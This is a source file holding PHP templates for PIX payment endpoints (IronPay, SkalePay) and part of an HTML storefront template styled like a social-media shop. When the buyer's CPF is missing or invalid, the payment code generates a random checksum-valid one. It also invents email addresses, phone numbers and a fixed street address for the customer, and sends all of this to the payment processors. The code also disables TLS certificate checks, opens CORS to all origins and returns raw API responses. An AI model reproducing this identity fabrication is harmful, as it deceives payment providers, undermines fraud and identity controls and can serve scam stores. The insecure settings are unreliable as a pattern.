$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
$curlError = curl_error($ch);
curl_close($ch);

if ($curlError) {
    ob_end_clean();
    echo json_encode(['success'=>false, 'message'=>'Erro de conexao: ' . $curlError]);
    exit;
}

$res = json_decode($result, true);

// Busca o codigo PIX na resposta
$pixCode = null;
$qrImage = null;

// Verifica varios caminhos possiveis na resposta
if (isset($res['pix']['qr_code'])) $pixCode = $res['pix']['qr_code'];
elseif (isset($res['pix']['qrcode'])) $pixCode = $res['pix']['qrcode'];
elseif (isset($res['pix']['emv'])) $pixCode = $res['pix']['emv'];
elseif (isset($res['pix']['qr_code_emv'])) $pixCode = $res['pix']['qr_code_emv'];
elseif (isset($res['qr_code'])) $pixCode = $res['qr_code'];
elseif (isset($res['qrcode'])) $pixCode = $res['qrcode'];
elseif (isset($res['emv'])) $pixCode = $res['emv'];
elseif (isset($res['pix_qr_code'])) $pixCode = $res['pix_qr_code'];
elseif (isset($res['transaction']['pix']['qr_code'])) $pixCode = $res['transaction']['pix']['qr_code'];
elseif (isset($res['data']['pix']['qr_code'])) $pixCode = $res['data']['pix']['qr_code'];

// Busca QR Image
if (isset($res['pix']['qr_code_url'])) $qrImage = $res['pix']['qr_code_url'];
elseif (isset($res['pix']['qrcode_url'])) $qrImage = $res['pix']['qrcode_url'];
elseif (isset($res['qr_code_url'])) $qrImage = $res['qr_code_url'];

// Busca recursiva se nao encontrou
if (!$pixCode && is_array($res)) {
    $json = json_encode($res);
    if (preg_match('/000201[A-Za-z0-9+\\/=]+/', $json, $matches)) {
        $pixCode = $matches[0];
    }
}

ob_end_clean();

if ($pixCode) {
    if (!$qrImage) $qrImage = 'https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=' . urlencode($pixCode);
    echo json_encode(['success'=>true, 'pix_code'=>$pixCode, 'qr_image'=>$qrImage]);
} else {
    $msg = 'Erro ao gerar PIX';
    if (isset($res['error'])) $msg = $res['error'];
    elseif (isset($res['message'])) $msg = $res['message'];
    elseif (isset($res['errors']) && is_array($res['errors'])) $msg = implode(', ', $res['errors']);
    
    $debug = ['http_code'=>$httpCode, 'response'=>$res];
    echo json_encode(['success'=>false, 'message'=>$msg, 'debug'=>$debug]);
}
    ?>`,

    ironpay: `<?php
error_reporting(0);
ini_set('display_errors', 0);
header("Access-Control-Allow-Origin: *");
header("Content-Type: application/json; charset=UTF-8");
ob_start();

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') { http_response_code(200); exit; }

$apiToken = '{{KEY_TOKEN}}';

if (empty($apiToken)) { 
    ob_end_clean(); 
    echo json_encode(['success'=>false, 'message'=>'Erro: Token IronPay nao configurado.']); 
    exit; 
}

function gerarCpfValido() {
    $n = []; for ($i = 0; $i < 9; $i++) $n[$i] = rand(0, 9);
    $d1 = 0; for ($i = 0; $i < 9; $i++) $d1 += $n[$i] * (10 - $i);
    $r1 = $d1 % 11; $d1 = ($r1 < 2) ? 0 : 11 - $r1;
    $d2 = 0; for ($i = 0; $i < 9; $i++) $d2 += $n[$i] * (11 - $i);
    $d2 += $d1 * 2; $r2 = $d2 % 11; $d2 = ($r2 < 2) ? 0 : 11 - $r2;
    return implode('', $n) . $d1 . $d2;
}

function sanitizarTelefone($phone) {
    $phone = preg_replace('/\\D/', '', $phone);
    if (empty($phone)) return '21999999999';
    if (strlen($phone) < 10) $phone = '21' . str_pad($phone, 9, '9', STR_PAD_LEFT);
    if (strlen($phone) == 10) $phone = substr($phone, 0, 2) . '9' . substr($phone, 2);
    if (strlen($phone) > 11) $phone = substr($phone, 0, 11);
    return $phone;
}

function sanitizarEmail($email) {
    $email = trim($email);
    if (empty($email) || !filter_var($email, FILTER_VALIDATE_EMAIL)) {
        return 'cliente' . rand(1000, 9999) . '@email.com';
    }
    return $email;
}

function sanitizarNome($name) {
    $name = trim($name);
    $name = preg_replace('/[^a-zA-Z\\x{00C0}-\\x{017F}\\s]/u', '', $name);
    if (empty($name) || strlen($name) < 2) return 'Cliente';
    return $name;
}

$input = json_decode(file_get_contents('php://input'), true);
if (!$input) { ob_end_clean(); echo json_encode(['success'=>false, 'message'=>'Sem dados']); exit; }

$amount = (int)round(($input['amount'] ?? 0) * 100);
$cpfInput = preg_replace('/\\D/', '', $input['cpf'] ?? '');
$isValidFormat = (strlen($cpfInput) == 11 && !preg_match('/^(\\d)\\1{10}$/', $cpfInput));
$cpf = $isValidFormat ? $cpfInput : gerarCpfValido();

$name = sanitizarNome($input['customer']['name'] ?? 'Cliente');
$email = sanitizarEmail($input['customer']['email'] ?? '');
$phone = sanitizarTelefone($input['customer']['phone'] ?? '');
$items = $input['items'] ?? [];

$offerHash = substr(md5($email . microtime(true)), 0, 5);
$firstItemTitle = !empty($items) ? ($items[0]['title'] ?? 'Produto') : 'Produto';

$cart = [];
if (!empty($items)) {
    foreach ($items as $item) {
        $cart[] = [
            'product_hash' => substr(md5($item['title'] ?? 'Produto'), 0, 10),
            'title' => $item['title'] ?? 'Produto',
            'cover' => null,
            'price' => (int)round(($item['unit_price'] ?? 0) * 100),
            'quantity' => (int)($item['quantity'] ?? 1),
            'operation_type' => 1,
            'tangible' => false
        ];
    }
} else {
    $cart[] = [
        'product_hash' => substr(md5('Produto'), 0, 10),
        'title' => 'Produto',
        'cover' => null,
        'price' => $amount,
        'quantity' => 1,
        'operation_type' => 1,
        'tangible' => false
    ];
}

$payload = [
    'amount' => $amount,
    'offer_hash' => $offerHash,
    'payment_method' => 'pix',
    'customer' => [
        'name' => $name,
        'email' => $email,
        'phone_number' => $phone,
        'document' => $cpf,
        'street_name' => 'Rua Exemplo',
        'number' => '100',
        'complement' => '',
        'neighborhood' => 'Centro',
        'city' => 'Sao Paulo',
        'state' => 'SP',
        'zip_code' => '01001000'
    ],
    'cart' => $cart,
    'expire_in_days' => 1,
    'transaction_origin' => 'api'
];

$url = 'https://api.ironpayapp.com.br/api/public/v1/transactions?api_token=' . urlencode($apiToken);

$ch = curl_init($url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json', 'Accept: application/json']);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);
$result = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
$curlError = curl_error($ch);
curl_close($ch);

if ($curlError) { ob_end_clean(); echo json_encode(['success'=>false, 'message'=>'Erro cURL: '.$curlError]); exit; }

$res = json_decode($result, true);
$pixCode = null;

if (isset($res['data']['pix']['qrcode'])) $pixCode = $res['data']['pix']['qrcode'];
elseif (isset($res['data']['pix']['payload'])) $pixCode = $res['data']['pix']['payload'];
elseif (isset($res['data']['pix']['emv'])) $pixCode = $res['data']['pix']['emv'];
elseif (isset($res['pix']['qrcode'])) $pixCode = $res['pix']['qrcode'];
elseif (isset($res['pix']['payload'])) $pixCode = $res['pix']['payload'];
elseif (isset($res['qrcode'])) $pixCode = $res['qrcode'];
elseif (isset($res['payload'])) $pixCode = $res['payload'];
elseif (isset($res['emv'])) $pixCode = $res['emv'];

if (!$pixCode && is_array($res)) {
    function buscarPixRecursivoIron($arr) {
        foreach ($arr as $v) {
            if (is_string($v) && strlen($v) > 50 && (strpos($v, '000201') === 0 || strpos($v, 'br.gov') !== false)) return $v;
            if (is_array($v)) { $r = buscarPixRecursivoIron($v); if ($r) return $r; }
        }
        return null;
    }
    $pixCode = buscarPixRecursivoIron($res);
}

ob_end_clean();

if ($pixCode) {
    $qrImage = 'https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=' . urlencode($pixCode);
    echo json_encode(['success'=>true, 'pix_code'=>$pixCode, 'qr_image'=>$qrImage]);
} else {
    $msg = 'Erro ao gerar PIX na IronPay';
    if (isset($res['message'])) $msg = $res['message'];
    elseif (isset($res['error'])) $msg = $res['error'];
    echo json_encode(['success'=>false, 'message'=>$msg, 'api_response'=>$res, 'http_code'=>$httpCode]);
}
?>`,

    skalepay: `<?php
error_reporting(0);
ini_set('display_errors', 0);
header("Access-Control-Allow-Origin: *");
header("Content-Type: application/json; charset=UTF-8");
ob_start();

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') { http_response_code(200); exit; }

$secretKey = '{{KEY_SECRET}}';

if (empty($secretKey)) { 
    ob_end_clean(); 
    echo json_encode(['success'=>false, 'message'=>'Erro: Secret Key SkalePay nao configurada.']); 
    exit; 
}

function gerarCpfValido() {
    $n = []; for ($i = 0; $i < 9; $i++) $n[$i] = rand(0, 9);
    $d1 = 0; for ($i = 0; $i < 9; $i++) $d1 += $n[$i] * (10 - $i);
    $r1 = $d1 % 11; $d1 = ($r1 < 2) ? 0 : 11 - $r1;
    $d2 = 0; for ($i = 0; $i < 9; $i++) $d2 += $n[$i] * (11 - $i);
    $d2 += $d1 * 2; $r2 = $d2 % 11; $d2 = ($r2 < 2) ? 0 : 11 - $r2;
    return implode('', $n) . $d1 . $d2;
}

function sanitizarTelefone($phone) {
    $phone = preg_replace('/\\D/', '', $phone);
    if (empty($phone)) return '21999999999';
    if (strlen($phone) < 10) $phone = '21' . str_pad($phone, 9, '9', STR_PAD_LEFT);
    if (strlen($phone) == 10) $phone = substr($phone, 0, 2) . '9' . substr($phone, 2);
    if (strlen($phone) > 11) $phone = substr($phone, 0, 11);
    return $phone;
}

function sanitizarEmail($email) {
    $email = trim($email);
    if (empty($email) || !filter_var($email, FILTER_VALIDATE_EMAIL)) {
        return 'cliente' . rand(1000, 9999) . '@email.com';
    }
    return $email;
}

function sanitizarNome($name) {
    $name = trim($name);
    $name = preg_replace('/[^a-zA-Z\\x{00C0}-\\x{017F}\\s]/u', '', $name);
    if (empty($name) || strlen($name) < 2) return 'Cliente';
    return $name;
}

$input = json_decode(file_get_contents('php://input'), true);
if (!$input) { ob_end_clean(); echo json_encode(['success'=>false, 'message'=>'Sem dados']); exit; }

$amount = (int)round(($input['amount'] ?? 0) * 100);
$cpfInput = preg_replace('/\\D/', '', $input['cpf'] ?? '');
$isValidFormat = (strlen($cpfInput) == 11 && !preg_match('/^(\\d)\\1{10}$/', $cpfInput));
$cpf = $isValidFormat ? $cpfInput : gerarCpfValido();

$name = sanitizarNome($input['customer']['name'] ?? 'Cliente');
$email = sanitizarEmail($input['customer']['email'] ?? '');
$phone = sanitizarTelefone($input['customer']['phone'] ?? '');
$items = $input['items'] ?? [];

$itemsList = [];
if (!empty($items)) {
    foreach ($items as $item) {
        $itemsList[] = [
            'title' => $item['title'] ?? 'Produto',
            'unitPrice' => (int)round(($item['unit_price'] ?? 0) * 100),
            'quantity' => (int)($item['quantity'] ?? 1),
            'tangible' => $item['tangible'] ?? false
        ];
    }
} else {
    $itemsList[] = [
        'title' => 'Pedido',
        'unitPrice' => $amount,
        'quantity' => 1,
        'tangible' => false
    ];
}

$payload = [
    'amount' => $amount,
    'paymentMethod' => 'pix',
    'customer' => [
        'name' => $name,
        'email' => $email,
        'phone' => $phone,
        'document' => [
            'type' => 'cpf',
            'number' => $cpf
        ]
    ],
    'items' => $itemsList,
    'pix' => [
        'expiresInDays' => 1
    ]
];

$url = 'https://api.conta.skalepay.com.br/v1/transactions';
$auth = base64_encode("{$secretKey}:x");

$ch = curl_init($url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json', 'Authorization: Basic ' . $auth]);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);
$result = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
$curlError = curl_error($ch);
curl_close($ch);

if ($curlError) { ob_end_clean(); echo json_encode(['success'=>false, 'message'=>'Erro cURL: '.$curlError]); exit; }

$res = json_decode($result, true);
$pixCode = null;

if (isset($res['data']['pix']['qr_code'])) $pixCode = $res['data']['pix']['qr_code'];
elseif (isset($res['data']['pix']['payload'])) $pixCode = $res['data']['pix']['payload'];
elseif (isset($res['pix']['qr_code'])) $pixCode = $res['pix']['qr_code'];
elseif (isset($res['pix']['payload'])) $pixCode = $res['pix']['payload'];
elseif (isset($res['qr_code'])) $pixCode = $res['qr_code'];
elseif (isset($res['payload'])) $pixCode = $res['payload'];

if (!$pixCode && is_array($res)) {
    function buscarPixRecursivoSkale($arr) {
        foreach ($arr as $v) {
            if (is_string($v) && strlen($v) > 50 && (strpos($v, '000201') === 0 || strpos($v, 'br.gov') !== false)) return $v;
            if (is_array($v)) { $r = buscarPixRecursivoSkale($v); if ($r) return $r; }
        }
        return null;
    }
    $pixCode = buscarPixRecursivoSkale($res);
}

ob_end_clean();

if ($pixCode) {
    $qrImage = 'https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=' . urlencode($pixCode);
    echo json_encode(['success'=>true, 'pix_code'=>$pixCode, 'qr_image'=>$qrImage]);
} else {
    $msg = 'Erro ao gerar PIX na SkalePay';
    if (isset($res['message'])) $msg = $res['message'];
    elseif (isset($res['error'])) $msg = $res['error'];
    echo json_encode(['success'=>false, 'message'=>$msg, 'api_response'=>$res, 'http_code'=>$httpCode]);
}
?>`,

    default: `<?php echo json_encode(['success'=>false, 'message'=>'Gateway não configurado corretamente.']); ?>`
};

// ============================================================================
// ===================== TEMPLATE LOJA (loja.html) ============================
// ============================================================================
// (Mantido em PT-BR conforme solicitação, pois não é a index.php)
const LOJA_TEMPLATE = `<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>{{STORE_NAME}}</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; -webkit-tap-highlight-color: transparent; }
        body { background-color: #f5f5f5; color: #161823; max-width: 500px; margin: 0 auto; padding-bottom: 20px; min-height: 100vh; position: relative; }
        .fixed-header-group { position: sticky; top: 0; left: 0; right: 0; max-width: 500px; margin: 0 auto; background: white; z-index: 100; }
        .top-bar { display: flex; align-items: center; padding: 8px 12px; gap: 10px; height: 50px; background: #fff; }
        .btn-back { font-size: 20px; cursor: pointer; color: #161823; padding: 4px; display: flex; align-items: center; }
        .search-box { flex: 1; background: #f1f1f2; border-radius: 4px; padding: 8px 12px; display: flex; align-items: center; gap: 8px; height: 36px; }
        .search-box svg { color: #888; width: 16px; height: 16px; flex-shrink: 0; }
        .search-input { border: none; background: transparent; width: 100%; outline: none; font-size: 14px; color: #161823; }
        .search-input::placeholder { color: #999; }
        .top-icons { display: flex; gap: 16px; align-items: center; }
        .icon-btn { position: relative; cursor: pointer; display: flex; align-items: center; justify-content: center; }
        .cart-badge { position: absolute; top: -6px; right: -8px; background: #fe2c55; color: white; border-radius: 50%; min-width: 18px; height: 18px; font-size: 10px; display: flex; align-items: center; justify-content: center; font-weight: 700; border: 2px solid white; box-sizing: content-box; padding: 0 4px; }
        .store-header { padding: 12px 16px; display: flex; align-items: center; gap: 12px; background: #fff; }
        .store-logo { width: 50px; height: 50px; border-radius: 50%; object-fit: cover; border: 1px solid #f1f1f2; flex-shrink: 0; }
        .store-info-text { flex: 1; min-width: 0; }
        .store-name { font-size: 15px; font-weight: 600; color: #161823; margin-bottom: 2px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
        .store-sales { font-size: 12px; color: #888; }
        .store-actions { display: flex; flex-direction: column; gap: 6px; align-items: flex-end; flex-shrink: 0; }
        .btn-follow { background: #fe2c55; color: white; border: none; padding: 6px 20px; border-radius: 4px; font-size: 13px; font-weight: 600; cursor: pointer; min-width: 90px; text-align: center; transition: all 0.2s; }
        .btn-follow.following { background: white; color: #161823; border: 1px solid #e3e3e4; }
        .btn-msg { background: white; color: #161823; border: 1px solid #e3e3e4; padding: 6px 20px; border-radius: 4px; font-size: 13px; font-weight: 500; cursor: pointer; min-width: 90px; text-align: center; }
        /* Toast de cupom */
        .coupon-toast { position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%) translateY(80px); background: #222; color: #fff; padding: 10px 20px; border-radius: 24px; font-size: 13px; font-weight: 500; z-index: 9999; opacity: 0; transition: all 0.3s; pointer-events: none; white-space: nowrap; }
        .coupon-toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
        /* Tela de Chat */
        .chat-screen { position: fixed; inset: 0; z-index: 500; background: #f5f5f5; display: flex; flex-direction: column; max-width: 500px; margin: 0 auto; transform: translateX(100%); visibility: hidden; transition: transform 0.3s cubic-bezier(0.25,0.46,0.45,0.94), visibility 0s linear 0.3s; }
        .chat-screen.open { transform: translateX(0); visibility: visible; transition: transform 0.3s cubic-bezier(0.25,0.46,0.45,0.94), visibility 0s linear 0s; }
        .chat-header { background: #fff; padding: 10px 16px; display: flex; align-items: center; gap: 12px; border-bottom: 1px solid #ebebeb; flex-shrink: 0; }
        .chat-header .btn-back-chat { cursor: pointer; padding: 4px; display: flex; align-items: center; color: #161823; }
        .chat-header .store-avatar { width: 36px; height: 36px; border-radius: 50%; object-fit: cover; }
        .chat-header .store-meta { flex: 1; }
        .chat-header .store-meta .name { font-size: 14px; font-weight: 600; color: #161823; }
        .chat-header .store-meta .online { font-size: 12px; color: #43a047; }
        .chat-header .cart-icon { cursor: pointer; color: #161823; }
        .chat-title { text-align: center; font-size: 16px; font-weight: 700; flex: 1; }
        .chat-messages { flex: 1; overflow-y: auto; padding: 16px; display: flex; flex-direction: column; gap: 10px; }
        .chat-messages::-webkit-scrollbar { display: none; }
        /* Perguntas sugeridas (pills) */
        .chat-suggestions { display: flex; flex-direction: column; gap: 8px; margin-top: 8px; }
        .suggestion-pill { background: #fff; border: 1.5px solid #fe2c55; border-radius: 24px; padding: 11px 18px; font-size: 14px; color: #fe2c55; cursor: pointer; text-align: left; transition: background 0.15s; font-family: inherit; }
        .suggestion-pill:active { background: #fff0f3; }
        /* Bubble de mensagem do usuario */
        .msg-user { align-self: flex-end; background: #fe2c55; color: #fff; border-radius: 18px 18px 4px 18px; padding: 10px 14px; font-size: 14px; max-width: 75%; }
        /* Bubble de resposta da loja */
        .msg-store { align-self: flex-start; display: flex; gap: 8px; align-items: flex-end; max-width: 85%; }
        .msg-store .avatar { width: 28px; height: 28px; border-radius: 50%; object-fit: cover; flex-shrink: 0; }
        .msg-store .bubble { background: #fff; border-radius: 18px 18px 18px 4px; padding: 10px 14px; font-size: 14px; color: #161823; box-shadow: 0 1px 3px rgba(0,0,0,0.07); }
        /* Indicador de digitando */
        .typing-indicator { align-self: flex-start; display: flex; gap: 8px; align-items: flex-end; }
        .typing-indicator .bubble { background: #fff; border-radius: 18px 18px 18px 4px; padding: 10px 14px; box-shadow: 0 1px 3px rgba(0,0,0,0.07); display: flex; gap: 4px; align-items: center; }
        .typing-indicator .dot { width: 7px; height: 7px; border-radius: 50%; background: #ccc; animation: bounce 1.2s infinite; }
        .typing-indicator .dot:nth-child(2) { animation-delay: 0.2s; }
        .typing-indicator .dot:nth-child(3) { animation-delay: 0.4s; }
        @keyframes bounce { 0%,60%,100%{transform:translateY(0)} 30%{transform:translateY(-6px)} }
        /* Input de chat */
        .chat-input-bar { background: #fff; border-top: 1px solid #ebebeb; padding: 10px 14px; display: flex; align-items: center; gap: 10px; flex-shrink: 0; padding-bottom: max(10px, env(safe-area-inset-bottom)); }
        .chat-input { flex: 1; background: #f5f5f5; border: none; border-radius: 22px; padding: 10px 16px; font-size: 14px; outline: none; color: #161823; font-family: inherit; }
        .chat-input::placeholder { color: #aaa; }
        .chat-send-btn { width: 36px; height: 36px; border-radius: 50%; background: #e0e0e0; border: none; display: flex; align-items: center; justify-content: center; cursor: pointer; flex-shrink: 0; transition: background 0.2s; }
        .chat-send-btn.active { background: #fe2c55; }
        .chat-send-btn svg { color: #fff; }
        .coupons-bar { display: flex; gap: 8px; padding: 10px 16px; background: #fff; overflow-x: auto; }
        .coupons-bar::-webkit-scrollbar { display: none; }
        .coupon-card { flex-shrink: 0; display: flex; align-items: center; gap: 10px; padding: 8px 12px; border: 1px solid #e0e0e0; border-radius: 4px; background: #fff; min-width: 180px; }
        .coupon-card.highlight { border-color: #ffcdd2; background: linear-gradient(90deg, #fff5f5 0%, #fff 100%); }
        .coupon-info { flex: 1; min-width: 0; }
        .coupon-title { font-size: 12px; font-weight: 600; color: #161823; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
        .coupon-sub { font-size: 10px; color: #888; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
        .coupon-btn { background: #fe2c55; color: white; border: none; padding: 4px 10px; border-radius: 4px; font-size: 11px; font-weight: 600; cursor: pointer; flex-shrink: 0; }
        .coupon-btn.outline { background: transparent; color: #fe2c55; border: 1px solid #fe2c55; }
        .nav-tabs { display: flex; border-bottom: 1px solid #e8e8e8; background: #fff; }
        .nav-item { flex: 1; text-align: center; padding: 12px 0; font-size: 14px; color: #888; cursor: pointer; position: relative; font-weight: 500; transition: color 0.2s; }
        .nav-item.active { color: #161823; font-weight: 600; }
        .nav-item.active::after { content: ''; position: absolute; bottom: 0; left: 50%; transform: translateX(-50%); width: 50px; height: 2px; background: #161823; }
        .tab-content { display: none; background: #fff; }
        .tab-content.active { display: block; }
        /* Pagina Inicial */
        .section-title { font-size: 14px; font-weight: 600; color: #161823; padding: 16px 16px 12px; display: flex; align-items: center; justify-content: space-between; }
        .section-title svg { color: #999; }
        .top-products-scroll { display: flex; gap: 10px; padding: 0 16px 16px; overflow-x: auto; }
        .top-products-scroll::-webkit-scrollbar { display: none; }
        .top-prod-card { flex-shrink: 0; width: 110px; background: #fff; border-radius: 8px; overflow: hidden; position: relative; }
        .top-prod-card .rank-badge { position: absolute; top: 6px; left: 6px; width: 20px; height: 20px; border-radius: 4px; display: flex; align-items: center; justify-content: center; font-size: 11px; font-weight: 700; color: #fff; z-index: 2; }
        .top-prod-card .rank-badge.r1 { background: linear-gradient(135deg, #ff6b6b, #ee5a5a); }
        .top-prod-card .rank-badge.r2 { background: linear-gradient(135deg, #ffa726, #fb8c00); }
        .top-prod-card .rank-badge.r3 { background: linear-gradient(135deg, #ffca28, #ffc107); }
        .top-prod-card .prod-img { width: 100%; height: 110px; object-fit: cover; background: #f8f8f8; }
        .top-prod-card .prod-info { padding: 8px; }
        .top-prod-card .prod-title { font-size: 11px; color: #333; line-height: 1.3; height: 28px; overflow: hidden; display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; margin-bottom: 6px; }
        .top-prod-card .price-row { display: flex; align-items: baseline; gap: 4px; flex-wrap: wrap; }
        .top-prod-card .price-current { color: #fe2c55; font-size: 14px; font-weight: 700; }
        .top-prod-card .price-original { color: #b0b0b4; font-size: 10px; text-decoration: line-through; }
        .top-prod-card .badges { display: flex; gap: 4px; flex-wrap: wrap; margin-top: 4px; }
        .top-prod-card .badge-off { background: #fff2f5; color: #fe2c55; font-size: 9px; padding: 2px 4px; border-radius: 2px; font-weight: 500; }
        .top-prod-card .badge-free { background: #e8f5e9; color: #43a047; font-size: 9px; padding: 2px 4px; border-radius: 2px; font-weight: 500; }
        .top-prod-card .sales-count { font-size: 10px; color: #999; margin-top: 4px; }
        .recommend-section { background: #fff; margin-top: 8px; }
        .recommend-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 8px; padding: 0 12px 16px; }
        .grid-prod-card { background: #fff; border-radius: 8px; overflow: hidden; border: 1px solid #f0f0f0; }
        .grid-prod-card .prod-img { width: 100%; aspect-ratio: 1; object-fit: cover; background: #f8f8f8; cursor: pointer; }
        .grid-prod-card .prod-info { padding: 10px; }
        .grid-prod-card .prod-title { font-size: 12px; color: #333; line-height: 1.3; height: 32px; overflow: hidden; display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; margin-bottom: 6px; cursor: pointer; }
        .grid-prod-card .price-row { display: flex; align-items: baseline; gap: 4px; flex-wrap: wrap; }
        .grid-prod-card .price-current { color: #fe2c55; font-size: 15px; font-weight: 700; }
        .grid-prod-card .price-original { color: #b0b0b4; font-size: 11px; text-decoration: line-through; }
        .grid-prod-card .badges { display: flex; gap: 4px; flex-wrap: wrap; margin-top: 6px; }
        .grid-prod-card .badge-off { background: #fff2f5; color: #fe2c55; font-size: 10px; padding: 2px 5px; border-radius: 2px; font-weight: 500; }
        .grid-prod-card .badge-free { background: #e8f5e9; color: #43a047; font-size: 10px; padding: 2px 5px; border-radius: 2px; font-weight: 500; }
        .grid-prod-card .sales-count { font-size: 11px; color: #999; margin-top: 6px; }
        /* Aba Produtos */
        .filters-bar { display: flex; align-items: center; padding: 10px 16px; gap: 12px; overflow-x: auto; white-space: nowrap; background: #fff; border-bottom: 1px solid #f0f0f0; }
        .filters-bar::-webkit-scrollbar { display: none; }
        .filter-opt { font-size: 13px; color: #757575; cursor: pointer; padding: 4px 0; transition: all 0.2s; }
        .filter-opt.active { color: #161823; font-weight: 600; }
        .filter-separator { width: 1px; height: 14px; background: #e3e3e4; flex-shrink: 0; }
        .filter-icon-container { margin-left: auto; display: flex; align-items: center; cursor: pointer; padding-left: 10px; flex-shrink: 0; }
        .products-list { background: #fff; }
        .product-card { display: flex; padding: 12px 16px; border-bottom: 1px solid #f5f5f5; gap: 12px; position: relative; }
        .prod-img-box { width: 100px; height: 100px; flex-shrink: 0; background: #f8f8f8; border-radius: 6px; overflow: hidden; cursor: pointer; }
        .prod-img-box .prod-img { width: 100%; height: 100%; object-fit: cover; }
        .prod-info { flex: 1; display: flex; flex-direction: column; min-width: 0; }
        .prod-info .prod-title { font-size: 13px; color: #161823; margin-bottom: 6px; line-height: 1.4; display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden; cursor: pointer; }
        .prod-badges { display: flex; gap: 5px; margin-bottom: 6px; flex-wrap: wrap; }
        .badge-off { background: #fff2f5; color: #fe2c55; font-size: 10px; padding: 2px 5px; border-radius: 2px; font-weight: 500; display: flex; align-items: center; gap: 2px; }
        .badge-free { background: #e8f5e9; color: #43a047; font-size: 10px; padding: 2px 5px; border-radius: 2px; font-weight: 500; }
        .prod-meta { display: flex; align-items: center; gap: 4px; font-size: 11px; color: #757575; margin-bottom: 4px; }
        .price-box { margin-top: auto; }
        .price-current { color: #fe2c55; font-size: 17px; font-weight: 700; }
        .price-original { color: #b0b0b4; font-size: 11px; text-decoration: line-through; display: block; margin-top: 2px; }
        .card-actions { position: absolute; bottom: 12px; right: 16px; display: flex; align-items: center; gap: 8px; }
        .btn-mini-cart { width: 32px; height: 32px; border-radius: 6px; background: #fff5f5; display: flex; align-items: center; justify-content: center; border: none; cursor: pointer; color: #fe2c55; }
        .btn-buy-card { background: #fe2c55; color: white; border: none; padding: 0 16px; height: 32px; border-radius: 6px; font-size: 13px; font-weight: 600; cursor: pointer; }
        /* Aba Categorias */
        .categories-list { background: #fff; }
        .category-item { display: flex; align-items: center; padding: 14px 16px; border-bottom: 1px solid #f5f5f5; gap: 14px; cursor: pointer; transition: background 0.2s; }
        .category-item:active { background: #f9f9f9; }
        .category-img { width: 50px; height: 50px; border-radius: 6px; object-fit: cover; background: #f8f8f8; flex-shrink: 0; }
        .category-info { flex: 1; min-width: 0; }
        .category-name { font-size: 14px; font-weight: 500; color: #161823; margin-bottom: 2px; }
        .category-count { font-size: 12px; color: #888; }
        .category-arrow { color: #ccc; flex-shrink: 0; }
        .empty-state { text-align: center; padding: 60px 20px; color: #999; }
        .empty-state svg { width: 48px; height: 48px; color: #ddd; margin-bottom: 12px; }
        /* Modal */
        .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); display: none; z-index: 2000; align-items: flex-end; justify-content: center; }
        .modal-overlay.active { display: flex; }
        .modal-content { background: white; width: 100%; max-width: 500px; border-radius: 16px 16px 0 0; padding: 20px; animation: slideUp 0.3s ease-out; max-height: 85vh; overflow-y: auto; display: flex; flex-direction: column; position: relative; }
        @keyframes slideUp { from { transform: translateY(100%); } to { transform: translateY(0); } }
        .modal-close { position: absolute; right: 16px; top: 16px; width: 32px; height: 32px; border-radius: 50%; background: #f5f5f5; display: flex; align-items: center; justify-content: center; border: none; cursor: pointer; color: #666; z-index: 50; }
        .modal-header { display: flex; gap: 14px; margin-bottom: 20px; padding-bottom: 16px; border-bottom: 1px solid #f0f0f0; margin-top: 10px; }
        .modal-img { width: 90px; height: 90px; border-radius: 8px; object-fit: cover; background: #f8f8f8; }
        .modal-price-area { display: flex; flex-direction: column; justify-content: flex-end; }
        .modal-price-val { font-size: 22px; font-weight: 700; color: #fe2c55; }
        .opt-group { margin-bottom: 20px; }
        .opt-title { font-size: 14px; font-weight: 600; margin-bottom: 10px; color: #333; }
        .color-list { display: flex; gap: 10px; flex-wrap: wrap; }
        .color-item { border: 2px solid #e8e8e8; border-radius: 8px; cursor: pointer; width: 72px; display: flex; flex-direction: column; overflow: hidden; transition: border-color 0.2s; }
        .color-item img { width: 100%; height: 72px; object-fit: cover; }
        .color-item span { font-size: 10px; text-align: center; padding: 6px 4px; background: #fff; color: #333; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
        .color-item.selected { border-color: #161823; }
        .size-list { display: flex; gap: 8px; flex-wrap: wrap; }
        .size-item { border: 1px solid #e0e0e0; padding: 10px 18px; min-width: 50px; text-align: center; border-radius: 6px; cursor: pointer; font-size: 13px; color: #333; background: #fff; transition: all 0.2s; }
